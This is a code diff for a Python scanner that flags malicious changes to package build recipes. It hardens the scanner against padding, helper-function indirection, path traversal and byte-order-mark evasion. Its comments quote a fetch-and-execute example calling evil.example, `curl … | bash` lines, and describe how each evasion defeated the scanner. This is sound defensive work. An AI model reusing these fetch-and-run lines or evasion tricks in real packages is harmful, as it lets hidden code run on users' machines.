@@ -4,7 +4,12 @@ import logging
 
 from .config import load_rules
 from .findings import stamp
-from .tokenizer import join_line_continuations, split_lines  # noqa: F401
+from .tokenizer import (  # noqa: F401
+    collapse_traversal,
+    strip_leading_bom,
+    join_line_continuations,
+    split_lines,
+)
 from .regex_safety import (
     BACKTRACK_BUDGET_S,
     backtracking_risk,
@@ -46,6 +51,32 @@ _MESSAGE_LINE_RE = re.compile(
 # switch off every scoped rule, so any separator or substitution after
 # the message keyword disqualifies the line from message context.
 _COMMAND_CHAIN_RE = re.compile(r"[;&|]|\$\(|`")
+
+def _has_unquoted_redirect(line: str) -> bool:
+    """True when *line* redirects outside any quoted text.
+
+    `echo "x" > file` writes a file rather than addressing a reader, which
+    is the ordinary way a recipe appends a line to a system config. A `>`
+    *inside* the quotes is punctuation: `echo "==> run sudo pacman -S qemu"`
+    is the exact shape whose message classification keeps R062 and R081 off
+    printed instructions, and searching the whole line for `>` put that
+    false positive back on two benign packages.
+
+    Written as a scan rather than a regex on purpose. The obvious pattern -
+    `(?:"[^"]*"|'[^']*'|[^"'>])*>` - is a nested alternation that backtracks
+    catastrophically when there is no redirect at all: 942 ms on a
+    full-length line, which the regex audit refuses.
+    """
+    quote = ""
+    for char in line:
+        if quote:
+            if char == quote:
+                quote = ""
+        elif char in "\"'":
+            quote = char
+        elif char == ">":
+            return True
+    return False
 
 # Track function body boundaries for position-aware scoring.
 #
@@ -113,7 +144,7 @@ MAX_RULE_LINE_BYTES = 8192
 #: roughly ten minutes of CPU for a single package - multiplied again by
 #: `depth.MAX_DEPTH_NODES` on a full-depth run.
 #:
-#: 20,000 is five times the largest diff in the 3,739-diff locked benign
+#: 20,000 is five times the largest diff in the 3,246-diff locked benign
 #: corpus (3,839 lines; p99.9 is 2,117), so it truncates nothing real while
 #: holding the worst case near nine seconds.
 MAX_SCANNED_LINES = 20_000
@@ -131,11 +162,34 @@ def clamp_diff_lines(diff_text: str, package_name: str = "") -> tuple[str, bool]
     lines = diff_text.split("\n")
     if len(lines) <= MAX_SCANNED_LINES:
         return diff_text, False
+    # Comments and blank lines are not content, and spending the budget on
+    # them is the line-count twin of padding a single line with spaces:
+    # 20,000 `# c` lines pushed a `curl … | bash` past the ceiling and
+    # every pattern rule went blind together.
+    #
+    # They are still *emitted*, because dropping them would renumber every
+    # line after them and the reported line number is evidence. What
+    # changes is that they no longer count against the limit - and the
+    # total is held at twice it, so the cost this cap exists to bound
+    # stays bounded and a padder has to supply real content for at least
+    # half of what it sends.
+    kept: list[str] = []
+    content = 0
+    for line in lines:
+        body = line[1:] if line[:1] in ("+", "-", " ") else line
+        stripped = body.strip()
+        if stripped and not stripped.startswith("#"):
+            content += 1
+        kept.append(line)
+        if content >= MAX_SCANNED_LINES or len(kept) >= MAX_SCANNED_LINES * 2:
+            break
+    if len(kept) == len(lines):
+        return diff_text, False
     _log.warning(
-        "diff for %s holds %d lines; matching the first %d",
-        package_name or "<unnamed>", len(lines), MAX_SCANNED_LINES,
+        "diff for %s holds %d lines; matching %d (%d with content)",
+        package_name or "<unnamed>", len(lines), len(kept), content,
     )
-    return "\n".join(lines[:MAX_SCANNED_LINES]), True
+    return "\n".join(kept), True
 
 
 def _compiled(pattern: str):
@@ -168,6 +222,33 @@ def _compiled(pattern: str):
     return compiled
 
 
+#: Verdicts for dynamic patterns, kept so the answer is decided once.
+#:
+#: `backtracking_risk` *times* probe matches, so the verdict was both
+#: expensive - the probes ran again on every call, for every finding - and
+#: load-dependent: the same pattern could be accepted on an idle machine
+#: and refused on a busy one, which makes the reported line number depend
+#: on what else the box was doing. Caching per pattern fixes both: one
+#: measurement, one answer, for the life of the process.
+_dynamic_pattern_verdict: dict[str, bool] = {}
+
+
+def _dynamic_pattern_is_unsafe(pattern: str, compiled: re.Pattern) -> bool:
+    """True when *pattern* must be matched as literal text."""
+    verdict = _dynamic_pattern_verdict.get(pattern)
+    if verdict is None:
+        verdict = bool(
+            has_nested_quantifier(pattern)
+            or backtracking_risk(compiled) > BACKTRACK_BUDGET_S
+            or is_superlinear(compiled)
+        )
+        # Bounded: the callers pass rule-shaped fragments, but the cache
+        # must not become a way for a long diff to grow memory.
+        if len(_dynamic_pattern_verdict) < 4096:
+            _dynamic_pattern_verdict[pattern] = verdict
+    return verdict
+
+
 def find_line_in_diff(
     diff_text: str, pattern: str, prefix: str = r"\+"
 ) -> int | None:
@@ -194,11 +275,7 @@ def find_line_in_diff(
 
     try:
         compiled = _compile(pattern)
-        if (
-            has_nested_quantifier(pattern)
-            or backtracking_risk(compiled) > BACKTRACK_BUDGET_S
-            or is_superlinear(compiled)
-        ):
+        if _dynamic_pattern_is_unsafe(pattern, compiled):
             _log.warning(
                 "refusing dynamic line pattern with excessive backtracking "
                 "risk; matching it literally instead"
@@ -249,8 +326,32 @@ def resolve_generated_patterns(rules: list[dict]) -> list[dict]:
     return rules
 
 
+#: Whitespace runs, collapsed before the clamp measures a line.
+#:
+#: The clamp bounds matching cost, which is why it cannot simply be raised
+#: or replaced with sliding windows - the cost is the attacker's to choose
+#: and bounding the input bounds every pattern at once. But it measured
+#: *bytes*, and 8192 leading spaces are 8192 bytes of nothing: padding a
+#: line so the command starts past the ceiling turned every pattern rule
+#: off at once, R001 and the whole X-family together, leaving only the
+#: `line_truncated` gap, which carries no weight.
+#:
+#: A shell ignores leading and repeated whitespace, so collapsing it before
+#: measuring changes what no line means. It costs one linear pass and it
+#: removes the cheapest way to buy space under the ceiling: padding must
+#: now be made of real tokens, which a reader can see.
+_WHITESPACE_RUN_RE = re.compile(r"[^\S\n]{2,}")
+
+
 def clamp(line: str) -> str:
-    """Truncate *line* to :data:`MAX_RULE_LINE_BYTES` for matching."""
+    """Truncate *line* to :data:`MAX_RULE_LINE_BYTES` for matching.
+
+    Whitespace runs are collapsed first, so the budget is spent on content
+    rather than on padding chosen to exhaust it.
+    """
+    if len(line) <= MAX_RULE_LINE_BYTES:
+        return line
+    line = _WHITESPACE_RUN_RE.sub(" ", line)
     return line if len(line) <= MAX_RULE_LINE_BYTES else line[:MAX_RULE_LINE_BYTES]
 
 
@@ -296,7 +397,11 @@ def filter_raw_lines(lines: list[str]) -> list[tuple[int, str]]:
 
 def _is_message_line(line: str) -> bool:
     """True when *line* is a message and nothing else."""
-    return bool(_MESSAGE_LINE_RE.match(line)) and not _COMMAND_CHAIN_RE.search(line)
+    return (
+        bool(_MESSAGE_LINE_RE.match(line))
+        and not _COMMAND_CHAIN_RE.search(line)
+        and not _has_unquoted_redirect(line)
+    )
 
 
 def _inline_body(stripped: str) -> bool:
@@ -417,20 +522,168 @@ def _enclosing_function_map(lines: list[str]) -> dict[int, str]:
     return enclosing
 
 
+def _function_bodies(lines: list[str]) -> dict[str, list[str]]:
+    """Return ``{function_name: [body lines]}``, innermost owner wins."""
+    bodies: dict[str, list[str]] = {}
+    fn_map = _enclosing_function_map(lines)
+    for index, name in fn_map.items():
+        if name:
+            bodies.setdefault(name, []).append(lines[index])
+    return bodies
+
+
+def _caller_closure_map(lines: list[str]) -> dict[str, frozenset[str]]:
+    """Return ``{function_name: names that transitively call it}``.
+
+    A named scope such as ``scope = ["pkgver"]`` asks "does this code run
+    during pkgver?", but it was answered with "is this line lexically
+    inside a function spelled pkgver?".  The reviewed party chooses the
+    spelling, so the gate was theirs:
+
+        _fetch() { curl -s "$url" | sed ...; }
+        pkgver() { _fetch; }
+
+    is network access in pkgver by any definition that matters, and R051
+    did not see it.  Following the calls costs one pass and takes the
+    naming decision back.
+    """
+    bodies = _function_bodies(lines)
+    if len(bodies) < 2:
+        return {}
+    names = sorted(bodies, key=len, reverse=True)
+    # A call is the name in command position: at the start of a command,
+    # not an assignment to it and not the tail of a longer word or path.
+    call_re = re.compile(
+        r"(?:^|[;&|(){}`]|\$\(|\s)(" + "|".join(re.escape(n) for n in names)
+        + r")(?=[\s;&|)}`]|$)"
+    )
+    calls: dict[str, set[str]] = {}
+    for name, body in bodies.items():
+        found = set()
+        for line in body:
+            stripped = line.lstrip("+").lstrip()
+            for match in call_re.finditer(stripped):
+                found.add(match.group(1))
+        found.discard(name)
+        calls[name] = found
+
+    # Invert, then close over the inverted edges: pkgver -> _fetch means
+    # _fetch's callers include pkgver, and anything reaching pkgver.
+    callers: dict[str, set[str]] = {name: set() for name in bodies}
+    for caller, callees in calls.items():
+        for callee in callees:
+            callers[callee].add(caller)
+    for _ in range(len(bodies)):
+        changed = False
+        for name, direct in callers.items():
+            grown = set(direct)
+            for caller in direct:
+                grown |= callers.get(caller, set())
+            grown.discard(name)
+            if grown != direct:
+                callers[name] = grown
+                changed = True
+        if not changed:
+            break
+    return {name: frozenset(found) for name, found in callers.items() if found}
+
+
+def _classify_caller_closure(lines: list[str]) -> dict[str, frozenset[str]]:
+    """Memoised wrapper: see :func:`_caller_closure_map`."""
+    return _classified("callers", lines, _caller_closure_map)
+
+
+class ScopeResolver:
+    """Which makepkg function's execution reaches a given diff line.
+
+    Every code rule outside the config-driven set asked the same question -
+    "is this line inside build/prepare/check/package?" - and answered it with
+    the *direct* enclosing function.  The reviewed party writes the function
+    names, so that answer was theirs to change:
+
+        _fetch() { curl -fsSL https://evil.example/x.sh -o "$srcdir/x.sh"; }
+        build()  { _fetch; bash "$srcdir/x.sh"; }
+
+    ``_fetch`` is not in ``_CRITICAL_FUNCTIONS``, so R061 and R137 both stood
+    down and a working fetch-and-execute scored as an ordinary download.
+    R051 had already been given the call closure for its ``pkgver`` scope;
+    this is the same closure, shared, so the remaining rules stop being
+    evadable by declaring a function.
+
+    *extra_lines* is the current PKGBUILD when the caller has it.  A diff
+    shows a hunk, so the ``build()`` that calls the added helper may not be
+    in it at all; the graph is built from the whole recipe where possible
+    while findings still come only from added lines.
+    """
+
+    __slots__ = ("_fn", "_callers")
+
+    def __init__(self, lines: list[str], extra_lines: list[str] | None = None):
+        self._fn = _classify_enclosing_function(lines)
+        graph_lines = lines if not extra_lines else list(lines) + list(extra_lines)
+        self._callers = _classify_caller_closure(graph_lines)
+
+    def direct(self, index: int) -> str | None:
+        """The function a line is lexically inside, or None."""
+        return self._fn.get(index)
+
+    def within(self, index: int, names) -> str | None:
+        """The name in *names* whose execution reaches *index*, or None.
+
+        The direct enclosing function wins when it qualifies, so an
+        unremarkable line in ``build()`` still reports ``build``.
+        """
+        enclosing = self._fn.get(index)
+        if enclosing is None:
+            return None
+        if enclosing in names:
+            return enclosing
+        for caller in sorted(self._callers.get(enclosing, ())):
+            if caller in names:
+                return caller
+        return None
+
+    def label(self, index: int, names) -> str:
+        """How to name the scope in a finding, without overstating it.
+
+        A finding that says ``build()`` when the line is in ``_fetch()``
+        sends the reader to the wrong place, so the indirection is named.
+        """
+        enclosing = self._fn.get(index)
+        reached = self.within(index, names)
+        if reached is None or enclosing is None or reached == enclosing:
+            return reached or (enclosing or "")
+        # Callers render this as `f"{label}()"`, so the trailing parens land
+        # on the reached function and this one supplies its own.
+        return f"{enclosing}(), called from {reached}"
+
+
 def _scope_matches(
-    scope: list[str], index: int, ctx_map: dict[int, str], fn_map: dict[int, str]
+    scope: list[str],
+    index: int,
+    ctx_map: dict[int, str],
+    fn_map: dict[int, str],
+    caller_map: dict[str, frozenset[str]] | None = None,
 ) -> bool:
     """Check *index* against a rule's scope.
 
     A scope entry matches either a line context (``function_body``,
-    ``message``, ``other``) or the name of the enclosing function
-    (``pkgver``, ``package``, ...).
+    ``message``, ``other``), the name of the enclosing function
+    (``pkgver``, ``package``, ...), or the name of a function that
+    transitively calls the enclosing one - a helper invoked from
+    ``pkgver()`` runs during pkgver whatever it is called.
     """
     ctx = ctx_map.get(index, "other")
     if ctx in scope:
         return True
     enclosing = fn_map.get(index)
-    return enclosing is not None and enclosing in scope
+    if enclosing is None:
+        return False
+    if enclosing in scope:
+        return True
+    if not caller_map:
+        return False
+    return bool(caller_map.get(enclosing, frozenset()).intersection(scope))
 
 
 def apply_rules(
@@ -461,11 +714,20 @@ def apply_rules(
     # because a long line was truncated for matching.
     ctx_map = _classify_line_context(raw_diff_lines)
     fn_map = _classify_enclosing_function(raw_diff_lines)
+    caller_map = _classify_caller_closure(raw_diff_lines)
 
     # These three candidate lists do not vary per rule, but used to be
     # rebuilt inside the loop: with ~75 rules that was 75 filtering passes
     # over every line of the diff.  Built once and shared, read-only.
-    raw_candidates = filter_raw_lines(raw_diff_lines)
+    # `a/b/../c` is `a/c` once the kernel opens it, and a raw-line rule
+    # anchored on `$pkgdir/etc/cron.d/` read the traversal spelling as a
+    # path into `/lib`.  Collapsed here as well as in the resolved text,
+    # because the rules that own package-root staging read raw lines
+    # deliberately - they need the quoting the tokenizer removes.
+    raw_candidates = [
+        (i, collapse_traversal(strip_leading_bom(ln)))
+        for i, ln in filter_raw_lines(raw_diff_lines)
+    ]
     added_candidates = [(i, ln) for i, ln in raw_candidates if ln.startswith("+")]
     if resolved_indices is not None:
         resolved_candidates = [
@@ -475,6 +737,20 @@ def apply_rules(
     else:
         resolved_candidates = _to_pairs(resolved_strings)
 
+    # Comments are filtered for raw-line rules by `filter_raw_lines` and were
+    # not filtered for resolved ones, so a resolved rule read commented-out
+    # text as code: `# curl ... | bash` scored R001 CRITICAL and R061 HIGH,
+    # a Critical band on a line that runs nothing.
+    #
+    # Two lists rather than one filtered list, because `include_comments` is
+    # exactly the opt-out: R012's payload is aimed at whoever *reads* the
+    # file and is a comment nearly every time, so that rule needs the
+    # unfiltered text and everything else needs the code.
+    resolved_code_candidates = [
+        (idx, line) for idx, line in resolved_candidates
+        if not _COMMENT_OR_DEP_RE.match(line)
+    ]
+
     # Comments and plain declarations are filtered out (or never resolved)
     # for every other rule, because a commented-out command does not run and
     # a `pkgdesc=` string is not executed.  R012 and R013 are the exceptions:
@@ -482,8 +758,10 @@ def apply_rules(
     # model summarising it - so what matters is every line the new revision
     # shows a reader.  Removals are excluded: text this diff deletes is text
     # the reader will not see.
+    # The BOM strip applies here too: R013 is the rule that reads this list
+    # and the rule a byte-order mark used to fire, at FATAL.
     reader_candidates = [
-        (i, ln) for i, ln in _to_pairs(raw_diff_lines)
+        (i, strip_leading_bom(ln)) for i, ln in _to_pairs(raw_diff_lines)
         if not ln.startswith("-") and not _DEP_DECLARATION_RE.match(ln)
     ]
     rules_by_id = {rule["id"]: rule for rule in rules}
@@ -504,7 +782,7 @@ def apply_rules(
                 added_candidates if rule.get("added_only") else raw_candidates
             )
         else:
-            candidates = resolved_candidates
+            candidates = resolved_code_candidates
         if rule.get("include_comments"):
             # For a raw-line rule the reader set *replaces* the default,
             # which drops the removed lines with it: a maintainer deleting a
@@ -513,7 +791,10 @@ def apply_rules(
             # forms a variable hides.
             candidates = (
                 reader_candidates if match_target == "raw_line"
-                else candidates + reader_candidates
+                # The *unfiltered* resolved list here: a rule that opts into
+                # comments must see them in the text resolution produced,
+                # not only in the raw lines.
+                else resolved_candidates + reader_candidates
             )
 
         compiled = _compiled(rule["pattern"])
@@ -524,7 +805,9 @@ def apply_rules(
 
         for idx, item in candidates:
             if compiled.search(item):
-                if rule_scope and not _scope_matches(rule_scope, idx, ctx_map, fn_map):
+                if rule_scope and not _scope_matches(
+                    rule_scope, idx, ctx_map, fn_map, caller_map
+                ):
                     continue
                 # A generic rule may defer to a more precise rule on the
                 # same command.  This preserves one finding per operation
@@ -538,7 +821,9 @@ def apply_rules(
                     and other_compiled.search(item)
                     and (
                         not other.get("scope")
-                        or _scope_matches(other["scope"], idx, ctx_map, fn_map)
+                        or _scope_matches(
+                            other["scope"], idx, ctx_map, fn_map, caller_map
+                        )
                     )
                     for other_id in rule.get("exclude_if_matches", [])
                 ):
